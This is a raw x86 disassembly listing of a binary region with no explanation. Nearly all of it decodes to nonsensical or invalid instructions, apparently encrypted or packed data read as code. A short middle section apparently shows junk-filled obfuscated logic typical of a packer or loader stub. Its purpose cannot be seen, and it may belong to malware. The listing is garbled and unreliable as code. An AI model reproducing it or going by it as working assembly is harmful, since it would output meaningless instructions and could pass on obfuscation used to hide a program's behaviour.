  4137dc:	les    esi,FWORD PTR [ecx+ebx*1+0x30c18d77]
  4137e3:	mov    cl,0x6f
  4137e5:	jbe    0x413790
  4137e7:	packuswb mm7,mm1
  4137ea:	and    edx,edi
  4137ec:	pop    ds
  4137ed:	or     ch,ah
  4137ef:	pop    eax
  4137f0:	popf   
  4137f1:	mov    gs,WORD PTR [ebx]
  4137f3:	or     dl,cl
  4137f5:	xchg   ebp,eax
  4137f6:	jnp    0x4137af
  4137f8:	(bad)  
  4137f9:	(bad)  
  4137fa:	add    DWORD PTR [eax],esp
  4137fc:	aad    0x84
  4137fe:	stos   BYTE PTR es:[edi],al
  4137ff:	or     al,0xe2
  413801:	xchg   edi,eax
  413802:	out    0x67,al
  413804:	mov    BYTE PTR [ecx],cl
  413806:	ds fadd st,st(4)
  413809:	out    dx,eax
  41380a:	inc    ebp
  41380b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380c:	jmp    0xecea85fe
  413811:	add    al,0xd2
  413813:	pop    ebp
  413814:	daa    
  413815:	xchg   ecx,eax
  413816:	xor    eax,0x5fac11d8
  41381c:	mov    ds:0x30f67474,al
  413821:	or     ebx,0x71e8f610
  413827:	pushf  
  413828:	mov    bh,0x77
  41382a:	adc    DWORD PTR [edx],ebx
  41382c:	push   eax
  41382d:	xchg   ecx,eax
  41382e:	aam    0x17
  413830:	mov    cl,0xcf
  413832:	pandn  mm6,QWORD PTR [ecx-0x84820f2]
  413839:	out    0x62,al
  41383b:	mov    ch,0x3b
  41383d:	stos   DWORD PTR es:[edi],eax
  41383e:	loope  0x4137d7
  413840:	sbb    eax,0x703d8bb9
  413845:	sub    dl,ah
  413847:	aas    
  413848:	xchg   esp,eax
  413849:	or     ecx,eax
  41384b:	loop   0x413846
  41384d:	aas    
  41384e:	mov    ds:0xda2fc2c2,al
  413853:	int    0xee
  413855:	push   cs
  413856:	pop    edx
  413857:	jp     0x4137de
  413859:	cmp    dh,BYTE PTR [ecx-0xe60f37]
  41385f:	in     al,dx
  413860:	xor    al,0x1c
  413862:	int    0x2b
  413864:	or     al,0xb5
  413866:	add    BYTE PTR [esi],0x90
  413869:	pushf  
  41386a:	aad    0xb9
  41386c:	mov    eax,ds:0xeed906b8
  413871:	pop    esi
  413872:	pop    edx
  413873:	push   ebx
  413874:	pop    ebx
  413875:	bound  edx,QWORD PTR [di+0x29]
  413879:	xchg   esi,eax
  41387a:	xchg   ebx,eax
  41387b:	dec    ecx
  41387c:	aaa    
  41387d:	into   
  41387e:	fidivr DWORD PTR [ebx+0x6c]
  413881:	scas   al,BYTE PTR es:[edi]
  413882:	dec    eax
  413883:	adc    edi,DWORD PTR [edi]
  413885:	and    al,cl
  413887:	jb     0x4138c8
  413889:	lods   eax,DWORD PTR ds:[esi]
  41388a:	fcomp  QWORD PTR [ecx+0x221189d2]
  413890:	icebp  
  413891:	jp     0x4138e4
  413893:	pop    ss
  413894:	sbb    DWORD PTR [eax],0x3e5e13f3
  41389a:	out    dx,al
  41389b:	ja     0x4138c8
  41389d:	mov    eax,ds:0xc4ac7d57
  4138a2:	in     al,dx
  4138a3:	mov    bl,0xf4
  4138a5:	jle    0x413921
  4138a7:	jbe    0x413843
  4138a9:	scas   al,BYTE PTR es:[edi]
  4138aa:	cld    
  4138ab:	cmp    BYTE PTR [edx+eax*8],bh
  4138ae:	inc    edi
  4138af:	jecxz  0x41385c
  4138b1:	mov    BYTE PTR [esi+ebp*8],dh
  4138b4:	(bad)  
  4138b5:	fnstsw WORD PTR ds:[eax]
  4138b8:	divps  xmm6,XMMWORD PTR [ecx]
  4138bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138bc:	adc    BYTE PTR [eax+0x1c1a3d57],ah
  4138c2:	jae    0x4138c8
  4138c4:	stc    
  4138c5:	push   0x70
  4138c7:	outs   dx,DWORD PTR ds:[esi]
  4138c8:	push   edi
  4138c9:	ror    BYTE PTR [esi],0x80
  4138cc:	push   ss
  4138cd:	dec    ecx
  4138ce:	ret    
  4138cf:	out    0x94,eax
  4138d1:	adc    ah,BYTE PTR [ecx+0x19]
  4138d4:	in     eax,0x87
  4138d6:	sti    
  4138d7:	push   esp
  4138d8:	inc    eax
  4138d9:	dec    ebx
  4138da:	or     al,0x60
  4138dc:	and    edx,DWORD PTR [edx+0x6c]
  4138df:	mov    bh,0x70
  4138e1:	mov    dl,0x31
  4138e3:	jnp    0x41390c
  4138e5:	mov    edi,0x721f807a
  4138ea:	out    dx,eax
  4138eb:	sub    bh,BYTE PTR ds:0xd3607274
  4138f1:	cmp    BYTE PTR [esi+0x50629d76],0x1d
  4138f8:	aaa    
  4138f9:	test   eax,0x69b4476f
  4138fe:	jbe    0x4138ee
  413900:	pop    esi
  413901:	mov    al,ds:0xb6f09faa
  413906:	sti    
  413907:	or     cl,cl
  413909:	fild   WORD PTR ds:0x8811cdb2
  41390f:	push   es
  413910:	jp     0x4138ac
  413912:	ja     0x4138dd
  413914:	popf   
  413915:	pop    esi
  413916:	icebp  
  413917:	cmp    ebx,0x75
  41391a:	pop    ds
  41391b:	or     DWORD PTR [esi+0x4f],eax
  41391e:	in     eax,dx
  41391f:	sub    DWORD PTR [ebx+0x79],edx
  413922:	es inc eax
  413924:	mov    edi,0xbe12d3dd
  413929:	lock pop edi
  41392b:	cmp    ch,dl
  41392d:	and    DWORD PTR [edx+0x46],esp
  413930:	stos   DWORD PTR es:[edi],eax
  413931:	push   edi
  413932:	(bad)  [eax+0x79]
  413935:	inc    esi
  413936:	(bad)
  413939:	iret   
  41393a:	push   edi
  41393b:	add    al,0x40
  41393d:	and    BYTE PTR [edi+ebp*4+0x6d],bh
  413941:	push   eax
  413942:	jecxz  0x41398a
  413944:	cs adc al,0xf5
  413947:	jb     0x4138dd
  413949:	mov    edi,0x70852267
  41394e:	add    edi,eax
  413950:	and    al,0xc6
  413952:	cli    
  413953:	and    esp,ebx
  413955:	jl     0x413941
  413957:	mov    esp,0x43f64ca0
  41395c:	and    BYTE PTR [eax+0x7e],ch
  41395f:	ds mov esi,0x57b2b838
  413965:	stos   DWORD PTR es:[edi],eax
  413966:	mov    ch,0x2
  413968:	mov    eax,DWORD PTR [eax+0x55]
  41396b:	rol    DWORD PTR [ebx-0xe],1
  41396e:	scas   eax,DWORD PTR es:[edi]
  41396f:	dec    ebp
  413970:	push   ebx
  413971:	mov    edi,0xcfb1b2d1
  413976:	sub    DWORD PTR [ebx+0x74],ebx
  413979:	clc    
  41397a:	xor    al,0x9c
  41397c:	test   ebx,edi
  41397e:	out    dx,eax
  41397f:	imul   ecx,DWORD PTR [ecx+0x19f77724],0xa0281a5c
  413989:	fs sbb al,0x8a
  41398c:	mov    esp,0xe3961dca
  413991:	(bad)  
  413992:	imul   esp,esp,0xffffffb5
  413995:	arpl   ax,ax
  413997:	sub    eax,0x8e7ef670
  41399c:	mov    dh,0x7d
  41399e:	(bad)  
  41399f:	push   ds
  4139a0:	fwait
  4139a1:	addr16 push ebx
  4139a3:	add    esi,DWORD PTR [edi-0x4d2bbb3f]
  4139a9:	mov    ch,0xc0
  4139ab:	mov    ebp,0x4a2f300d
  4139b0:	jp     0x41398d
  4139b2:	call   esp
  4139b4:	sbb    bh,BYTE PTR [edx-0x4d]
  4139b7:	cmp    eax,0xcefaeff8
  4139bc:	sbb    BYTE PTR ds:[eax+0x66],al
  4139c0:	js     0x41398e
  4139c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c3:	popf   
  4139c4:	mov    al,ds:0x41a1f87f
  4139c9:	adc    ah,ah
  4139cb:	dec    ecx
  4139cc:	add    al,0x6e
  4139ce:	xchg   ebp,eax
  4139cf:	pop    ss
  4139d0:	ins    DWORD PTR es:[edi],dx
  4139d1:	setle  BYTE PTR [esi]
  4139d4:	ds push 0xbf7a61ab
  4139da:	add    bh,BYTE PTR [ebx-0x1baa7b26]
  4139e0:	cli    
  4139e1:	lea    edi,[eax]
  4139e3:	add    eax,0x3b5398ea
  4139e8:	adc    al,0x87
  4139ea:	cmp    eax,0x55fe8048
  4139ef:	dec    ebx
  4139f0:	fstp   TBYTE PTR [edx+0x5ef419af]
  4139f6:	push   ds
  4139f7:	enter  0x1a94,0xa1
  4139fb:	outs   dx,BYTE PTR ds:[esi]
  4139fc:	sti    
  4139fd:	sbb    BYTE PTR [edx+0x4a119154],ah
  413a03:	mov    bh,0xda
  413a05:	xchg   esp,eax
  413a06:	sub    ebp,DWORD PTR cs:[eax-0x52]
  413a0a:	hlt    
  413a0b:	repz int3 
  413a0d:	pop    ss
  413a0e:	xor    al,0xb5
  413a10:	arpl   WORD PTR [ecx],di
  413a12:	nop
  413a13:	mov    bl,0xf0
  413a15:	les    edx,FWORD PTR [eax]
  413a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a18:	out    0x93,al
  413a1a:	adc    dl,al
  413a1c:	xchg   ebx,eax
  413a1d:	into   
  413a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a1f:	jp     0x413a73
  413a21:	jmp    0x413a7f
  413a23:	aaa    
  413a24:	mov    BYTE PTR [ecx],bh
  413a26:	test   al,0xe9
  413a28:	fimul  WORD PTR [edi-0x56]
  413a2b:	jp     0x413a4e
  413a2d:	and    al,0x54
  413a2f:	dec    edx
  413a30:	sub    BYTE PTR [esi],cl
  413a32:	cli    
  413a33:	xor    BYTE PTR gs:[edi+0x3ad1dfd8],dh
  413a3a:	cmp    bl,BYTE PTR [edi-0x1a57cfd1]
  413a40:	fidiv  WORD PTR [ebp-0x24]
  413a43:	mov    esi,0x83a6aea0
  413a48:	sbb    eax,0x881a2318
  413a4d:	mov    ecx,0xe86ed9d4
  413a52:	ja     0x413a11
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	jmp    0x7068:0x7e976ce9
  413a6e:	jo     0x413a29
  413a70:	jle    0x413ae2
  413a72:	jo     0x413a2c
  413a74:	add    eax,0x9c7c909
  413a79:	xchg   esi,eax
  413a7a:	push   DWORD PTR [edi]
  413a7c:	jnp    0x413a47
  413a7e:	adc    eax,0xcacc1eb9
  413a83:	jo     0x413aef
  413a85:	(bad)  
  413a86:	push   esi
  413a87:	xchg   BYTE PTR [eax],ah
  413a89:	(bad)  
  413a8a:	cdq    
  413a8b:	pop    esp
  413a8c:	mov    dh,0x3d
  413a8e:	out    0x2d,eax
  413a90:	add    DWORD PTR [ecx],ecx
  413a92:	cdq    
  413a93:	sub    BYTE PTR [eax+0x14],ch
  413a96:	inc    ebx
  413a97:	jge    0x413a80
  413a99:	es push 0x9622e935
  413a9f:	jae    0x413a59
  413aa1:	or     DWORD PTR [edi],edi
  413aa3:	inc    edx
  413aa4:	or     ebp,DWORD PTR [ebx+ebx*1]
  413aa7:	xor    eax,0xa1d317e
  413aac:	inc    ecx
  413aad:	imul   bh
  413aaf:	test   DWORD PTR [ebp-0x7e],0x253eda1b
  413ab6:	dec    edi
  413ab7:	inc    ecx
  413ab8:	jbe    0x413a50
  413aba:	add    bh,BYTE PTR [esp+esi*4+0x22]
  413abe:	mov    WORD PTR [esi],fs
  413ac0:	mov    ecx,0x7412888f
  413ac5:	rcr    DWORD PTR [ecx],1
  413ac7:	shl    DWORD PTR [eax+0x2d7c09dd],0xc6
  413ace:	dec    edi
  413acf:	enter  0x9aa4,0x35
  413ad3:	jo     0x413b0c
  413ad5:	xchg   ebx,eax
  413ad6:	mov    al,0xc
  413ad8:	mov    cl,0xcd
  413ada:	mov    fs,WORD PTR [esi]
  413adc:	or     eax,0xde68224a
  413ae1:	repz push esi
  413ae3:	into   
  413ae4:	or     al,BYTE PTR [edx+0x61]
  413ae7:	ficomp WORD PTR [ecx+0x3567cf95]
  413aed:	mov    ebp,0xaea3a387
  413af2:	cld    
  413af3:	sbb    DWORD PTR [edx+eax*8+0x5c],edi
  413af7:	int    0x36
  413af9:	mov    ebp,0x887ff85c
  413afe:	inc    edx
  413aff:	add    al,cl
  413b01:	shl    DWORD PTR [edi+0x3],0x1a
  413b05:	fstp   DWORD PTR [ecx+0x22009731]
  413b0b:	mov    ds:0x44fbf7fc,al
  413b10:	xchg   ebp,eax
  413b11:	jecxz  0x413b59
  413b13:	rcr    BYTE PTR [ebp-0x31],1
  413b16:	sahf   
  413b17:	lea    ecx,[esi+eax*1-0x3059d068]
  413b1e:	repz sub al,0x76
  413b21:	jbe    0x413ad7
  413b23:	mov    al,0x1
  413b25:	ss push 0x45
  413b28:	xlat   BYTE PTR ds:[ebx]
  413b29:	fld    DWORD PTR [edx+eax*1-0x2]
  413b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b2e:	add    edx,DWORD PTR [esi+edx*1-0xe75baef]
  413b35:	loope  0x413aeb
  413b37:	xchg   DWORD PTR ss:[edx-0x2df2bfd9],edi
  413b3e:	cmp    edi,ebp
  413b40:	repz xchg ebx,eax
  413b42:	stos   DWORD PTR es:[di],eax
  413b44:	je     0x413b98
  413b46:	mov    ecx,0xf0282be7
  413b4b:	repnz inc ebp
  413b4d:	out    0xea,al
  413b4f:	add    DWORD PTR [ebx],0xffffff91
  413b52:	mov    eax,0x68bdbaca
  413b57:	jns    0x413bd0
  413b59:	pop    es
  413b5a:	popa   
  413b5b:	iret   
  413b5c:	xchg   DWORD PTR [edi],ebx
  413b5e:	or     al,0x26
  413b60:	mov    esp,0x3552eb78
  413b65:	div    DWORD PTR [ebp-0x4c]
  413b68:	int3   
  413b69:	mov    ch,0x59
  413b6b:	test   BYTE PTR [ecx+0x7e],bl
  413b6e:	mov    dl,0xbf
  413b70:	mov    edi,0xf48506c9
  413b75:	test   al,0xe5
  413b77:	add    cl,BYTE PTR ss:[ebp-0x78721eb1]
  413b7e:	shr    eax,cl
  413b80:	xchg   ebx,eax
  413b81:	adc    esp,esp
  413b83:	retf   0x9515
  413b86:	cwde   
  413b87:	cmc    
  413b88:	dec    esp
  413b89:	int3   
  413b8a:	test   al,0x20
  413b8c:	lahf   
  413b8d:	test   DWORD PTR [ecx+0x2f279304],eax
  413b93:	adc    dh,BYTE PTR [eax+0x10ab3d4f]
  413b99:	jmp    0xe6ce:0x6402f983
  413ba0:	call   0x8a83:0xaf396a1
  413ba7:	sub    esp,eax
  413ba9:	repz in eax,0xbb
  413bac:	mov    eax,ds:0xafdcf13
  413bb1:	sub    esi,DWORD PTR [ebx-0x42f4a466]
  413bb7:	sbb    ebp,DWORD PTR [ebx]
  413bb9:	xchg   edx,eax
  413bba:	call   DWORD PTR [edx-0x41]
  413bbd:	mov    ebx,0xf13a890f
  413bc2:	push   cs
  413bc3:	dec    esp
  413bc4:	jns    0x413c3f
  413bc6:	push   edi
  413bc7:	enter  0xd41b,0x23
  413bcb:	imul   esi,DWORD PTR [eax+0x1bcd8d8a],0xd
  413bd2:	push   edi
  413bd3:	jb     0x413bb0
  413bd5:	push   cs
  413bd6:	cmp    DWORD PTR [eax+0x7f7ea21c],edx
  413bdc:	cmc    
  413bdd:	mov    bh,0xbf
  413bdf:	jmp    0x413c0c
  413be1:	sbb    al,0xdd
  413be3:	int    0xf3
  413be5:	pushf  
  413be6:	push   ds
  413be7:	sbb    ebx,DWORD PTR [eax+0x16a1eb6c]
  413bed:	and    DWORD PTR [edx+0x44],esp
  413bf0:	(bad)  
  413bf1:	ds mov edx,0x8e7dbd6c
  413bf7:	mov    ecx,0x7d0709f0
  413bfc:	jl     0x413c0b
  413bfe:	adc    eax,0xd70319fc
  413c03:	aad    0x7f
  413c05:	cs out dx,al
  413c07:	fisub  DWORD PTR [ebx+0x2e]
  413c0a:	cli    
  413c0b:	mov    dh,0xc1
  413c0d:	retf   0xf2ff
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	add    bl,BYTE PTR [esi]
  413c13:	xchg   ebp,eax
  413c14:	mov    ebx,0xe1fc4e05
  413c19:	pop    ecx
  413c1a:	mov    bl,0x86
  413c1c:	aaa    
  413c1d:	inc    ebp
  413c1e:	xchg   ebp,eax
  413c1f:	retf   
  413c20:	pop    ds
  413c21:	out    dx,eax
  413c22:	retf   
  413c23:	dec    edx
  413c24:	lea    edi,[esi]
  413c26:	lods   eax,DWORD PTR ds:[esi]
  413c27:	(bad)  
  413c29:	jmp    0xfdad:0xe5e04ba8
  413c30:	or     esi,edx
  413c32:	dec    edx
  413c33:	fadd   QWORD PTR [ecx]
  413c35:	jmp    0x413be8
  413c37:	or     al,0x2c
  413c39:	and    DWORD PTR [eax-0x41a09f71],edi
  413c3f:	scas   al,BYTE PTR es:[edi]
  413c40:	sbb    ebx,0x4b
  413c43:	mov    ?,WORD PTR [ebp+0xb]
  413c46:	inc    ebp
  413c47:	or     al,0x37
  413c49:	mov    esp,0xdeb5e506
  413c4e:	ret    0x6405
  413c51:	xor    eax,0x3968c7de
  413c56:	sub    DWORD PTR [edx+0x51],ebp
  413c59:	push   esi
  413c5a:	adc    bh,dh
  413c5c:	adc    BYTE PTR [ebx-0x2c],bh
  413c5f:	in     al,0xbb
  413c61:	pop    ebx
  413c62:	or     BYTE PTR [edx-0x26],dh
  413c65:	xchg   ebp,eax
  413c66:	fild   DWORD PTR [esi]
  413c68:	jmp    0x413c26
  413c6a:	adc    al,0x6a
  413c6d:	loop   0x413cb9
  413c6f:	fadd   DWORD PTR [esi]
  413c71:	sbb    DWORD PTR [ecx-0x32],ebp
  413c74:	fistp  QWORD PTR [ecx+eiz*2+0x744126a0]
  413c7b:	hlt    
  413c7c:	addps  xmm3,XMMWORD PTR [eax]
  413c7f:	popa   
  413c80:	mov    eax,esp
  413c82:	cmc    
  413c83:	or     ah,0x29
  413c86:	(bad)  [edi+0x812604b]
  413c8c:	cmp    ebx,ebp
  413c8e:	xchg   BYTE PTR [ebx-0x1ef6df44],bl
  413c94:	call   0x97e3:0x28289c70
  413c9b:	enter  0x9c52,0xbf
  413c9f:	cmp    esp,edi
  413ca1:	jo     0x413d10
  413ca3:	mov    dl,dh
  413ca5:	loope  0x413ca5
  413ca7:	inc    edx
  413ca8:	imul   ebp,DWORD PTR [esi+0x63afb262],0xdb2ce37b
  413cb2:	hlt    
  413cb3:	pop    edi
  413cb4:	fs popa 
  413cb6:	add    BYTE PTR [esi+ecx*2-0x69],dh
  413cba:	loopne 0x413d13
  413cbc:	sbb    eax,0x68e1cd56
  413cc1:	repz js 0x413cc4
  413cc4:	and    edi,ebx
  413cc6:	inc    eax
  413cc7:	ds mov ah,0x7f
  413cca:	xor    DWORD PTR [ecx],0xfffffff4
  413ccd:	jecxz  0x413cc0
  413ccf:	jb     0x413d0b
  413cd1:	jl     0x413cce
  413cd3:	cld    
  413cd4:	pop    ss
  413cd5:	dec    esi
  413cd6:	dec    esi
  413cd7:	push   esi
  413cd8:	xor    DWORD PTR [eax],edx
  413cda:	cwde   
  413cdb:	out    0x75,eax
  413cdd:	das    
  413cde:	xchg   esi,eax
  413cdf:	pop    ebp
  413ce0:	dec    esp
  413ce1:	hlt    
  413ce2:	daa    
  413ce3:	push   esi
  413ce4:	jecxz  0x413d27
  413ce6:	mov    ds:0xb674b0d5,al
  413ceb:	bound  edx,QWORD PTR [eax]
  413ced:	cmc    
  413cee:	das    
  413cef:	dec    edi
  413cf0:	xchg   edi,eax
  413cf1:	or     eax,0x8a320e7c
  413cf6:	jle    0x413cb7
  413cf8:	jmp    0x413d41
  413cfa:	fimul  DWORD PTR [esi]
  413cfc:	jnp    0x413d44
  413cfe:	fisttp WORD PTR [edi+ebx*1-0x10]
  413d02:	aaa    
  413d03:	push   ds
  413d04:	retf   0x5a26
  413d07:	hlt    
  413d08:	xor    DWORD PTR [edi],ecx
  413d0a:	dec    esp
  413d0b:	daa    
  413d0c:	daa    
  413d0d:	dec    ebx
  413d0e:	jnp    0x413d29
  413d10:	jae    0x413c95
  413d12:	mov    cl,0x65
  413d14:	lea    ebx,[edi+eiz*1-0x3f6bfd3f]
  413d1b:	popf   
  413d1c:	mov    ebx,0xd7663a52
  413d21:	jmp    0xa15e1608
  413d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d27:	dec    ebx
  413d28:	and    BYTE PTR [edi+0x6fc87ab4],0x52
  413d2f:	test   al,0xf7
  413d31:	push   cs
  413d32:	jb     0x413d52
  413d34:	jmp    0x413cc4
  413d36:	outs   dx,DWORD PTR ds:[esi]
  413d37:	fild   WORD PTR ds:0xe0458949
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	push   eax
  413e8c:	aam    0xba
  413e8e:	icebp  
  413e8f:	inc    edi
  413e90:	jbe    0x413f02
  413e92:	jo     0x413e4d
  413e94:	jle    0x413f06
  413e96:	jo     0x413e72
  413e98:	inc    esi
  413e99:	or     al,BYTE PTR [esp+ebx*1+0x63]
  413e9d:	pop    ds
  413e9e:	xlat   BYTE PTR ds:[ebx]
  413e9f:	pop    edx
  413ea0:	pop    dx
  413ea2:	xor    ah,BYTE PTR [ebp+0x61]
  413ea5:	sub    DWORD PTR [edx-0x636cf7e1],esp
  413eab:	add    BYTE PTR [edx+0x60f6c70a],al
  413eb1:	push   0xffffffe2
  413eb3:	jecxz  0x413e77
  413eb5:	pop    ss
  413eb6:	and    eax,eax
  413eb8:	aam    0x5f
  413eba:	sub    cl,BYTE PTR [ecx-0x7f1a346a]
  413ec0:	push   0x55
  413ec2:	sub    DWORD PTR [ecx+ecx*2-0x49d091d7],ecx
  413ec9:	fwait
  413eca:	xchg   esi,eax
  413ecb:	pop    esp
  413ecc:	push   ss
  413ecd:	mov    BYTE PTR [edx],ch
  413ecf:	cli    
  413ed0:	data16 outs dx,BYTE PTR ds:[esi]
  413ed2:	ds loope 0x413f0e
  413ed5:	xchg   edx,eax
  413ed6:	push   eax
  413ed7:	sub    eax,0xe7b032b3
  413edc:	adc    al,0x84
  413ede:	enter  0xb8e0,0xd7
  413ee2:	push   0x4e92835f
  413ee7:	xchg   esp,eax
  413ee8:	add    ebp,DWORD PTR [eax]
  413eea:	or     dh,BYTE PTR [edi+0x1bdc376d]
  413ef0:	adc    ch,BYTE PTR [eax-0x3beb261]
  413ef6:	push   0x7f22b8f1
  413efb:	mov    esp,0x78a99cd7
  413f00:	inc    edi
  413f01:	in     eax,dx
  413f02:	inc    esi
  413f03:	test   eax,0x69dc9e87
  413f08:	fldcw  WORD PTR [ebp-0x27]
  413f0b:	inc    esp
  413f0c:	sub    dh,BYTE PTR [ebp-0x26]
  413f0f:	icebp  
  413f10:	xor    esp,esi
  413f12:	adc    BYTE PTR [ebx+ecx*2],dl
  413f15:	or     BYTE PTR [eax],bh
  413f17:	enter  0x3ec5,0x61
  413f1b:	jp     0x413f99
  413f1d:	push   edx
  413f1e:	call   0x58c17cf0
  413f23:	(bad)  
  413f24:	sub    bl,bl
  413f26:	ins    BYTE PTR es:[edi],dx
  413f27:	inc    eax
  413f28:	inc    esi
  413f29:	imul   esp,ebp,0xcc48dfe9
  413f2f:	sbb    ecx,DWORD PTR [ecx+0x7d]
  413f32:	js     0x413f1f
  413f34:	sahf   
  413f35:	int3   
  413f36:	cs inc ecx
  413f38:	ror    BYTE PTR ds:0x6ccb9231,cl
  413f3e:	jg     0x413f40
  413f40:	test   al,0x26
  413f42:	xor    DWORD PTR [eax],ebx
  413f44:	mov    ecx,0x8db41649
  413f49:	sub    ebp,DWORD PTR [eax]
  413f4b:	arpl   WORD PTR [eax],cx
  413f4d:	cmovle edi,DWORD PTR [ebx+0x63]
  413f51:	int3   
  413f52:	pop    esp
  413f53:	dec    esp
  413f54:	push   ebp
  413f55:	push   ds
  413f56:	addr16 rol esp,cl
  413f59:	aad    0xdd
  413f5b:	push   esi
  413f5c:	mov    bh,0x34
  413f5e:	push   cs
  413f5f:	or     eax,0xa79ed7fa
  413f64:	sbb    eax,0xd220f980
  413f69:	aad    0x63
  413f6b:	add    eax,DWORD PTR [eax]
  413f6d:	ss sbb eax,0x80d7dcf4
  413f73:	xor    bl,0xf2
  413f76:	pop    ss
  413f77:	xchg   edx,eax
  413f78:	pop    es
  413f79:	jns    0x413f5c
  413f7b:	adc    dh,BYTE PTR [ecx]
  413f7d:	or     DWORD PTR [edi],0x4
  413f80:	das    
  413f81:	lods   eax,DWORD PTR ds:[esi]
  413f82:	jl     0x413f19
  413f84:	retf   
  413f85:	div    edx
  413f87:	sbb    edx,DWORD PTR [esi+0x26]
  413f8a:	jmp    0x413f32
  413f8c:	mov    bl,0x49
  413f8e:	cmp    al,0xf9
  413f90:	popa   
  413f91:	or     eax,0x61765201
  413f96:	adc    BYTE PTR [ecx],cl
  413f98:	test   DWORD PTR [ebp+0x61a7812c],ebp
  413f9e:	sbb    eax,0x780e2861
  413fa3:	push   edi
  413fa4:	pop    esi
  413fa5:	(bad)  
  413fa6:	std    
  413fa7:	mov    cl,BYTE PTR [edi-0x487ddcf6]
  413fad:	outs   dx,BYTE PTR ds:[esi]
  413fae:	lahf   
  413faf:	and    DWORD PTR [ebx+edi*2+0x13a45a17],eax
  413fb6:	test   eax,0x4ea60ac4
  413fbb:	push   eax
  413fbc:	jmp    0x413f7c
  413fbe:	in     al,dx
  413fbf:	sub    al,0xca
  413fc1:	in     eax,0xad
  413fc3:	and    cl,cl
  413fc5:	jmp    FWORD PTR [ebp+0x68a93df2]
  413fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fcc:	sahf   
  413fcd:	popf   
  413fce:	aad    0x91
  413fd0:	mov    ds:0x84d6d966,eax
  413fd5:	or     DWORD PTR [ebx],ebp
  413fd7:	inc    edi
  413fd8:	add    DWORD PTR [ebx+0x20],eax
  413fdb:	mov    ds,WORD PTR [ecx+0x1fe6abd1]
  413fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe2:	add    eax,esp
  413fe4:	xor    al,0xfd
  413fe6:	stos   BYTE PTR es:[edi],al
  413fe7:	pop    esp
  413fe8:	ds push esi
  413fea:	loope  0x413f85
  413fec:	cmp    DWORD PTR [edi+0x51],esi
  413fef:	(bad)  
  413ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ff1:	push   ds
  413ff2:	(bad)  
  413ff4:	dec    ebx
  413ff5:	jb     0x414035
  413ff7:	(bad)  
  413ff8:	dec    edi
